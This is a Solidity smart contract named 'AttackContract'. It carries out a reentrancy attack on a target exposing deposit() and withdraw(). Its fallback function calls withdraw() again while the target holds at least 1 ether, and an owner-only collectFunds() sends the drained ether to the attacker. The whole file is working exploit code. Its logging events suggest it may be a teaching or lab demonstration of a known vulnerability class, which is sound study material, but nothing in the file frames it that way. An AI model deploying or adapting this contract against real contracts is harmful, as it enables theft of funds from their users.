// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw() external;
}

contract AttackContract {
    IVulnerableContract public vulnerableContract;
    address public owner;

    // Event declarations
    event AttackStarted(address attacker);
    event AttackStep(address indexed attacker, string message);
    event FundsCollected(address collector, uint256 amount);

    constructor(address _vulnerableAddress) payable {
        vulnerableContract = IVulnerableContract(_vulnerableAddress);
        owner = msg.sender;
    }

    fallback() external payable {
        emit AttackStep(msg.sender, "Fallback triggered");
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw();
        }
    }

    function attack() public payable {
        require(msg.sender == owner, "Not owner!");
        emit AttackStarted(msg.sender);
        vulnerableContract.deposit{value: msg.value}();
        emit AttackStep(msg.sender, "Deposit completed");
        vulnerableContract.withdraw();
        emit AttackStep(msg.sender, "Withdraw called");
    }

    function collectFunds() external {
        require(msg.sender == owner, "Not owner!");
        uint256 balance = address(this).balance;
        (bool sent, ) = owner.call{value: balance}("");
        if (!sent) {
            revert("Transaction Failed!");
        }
        emit FundsCollected(owner, balance);
    }
}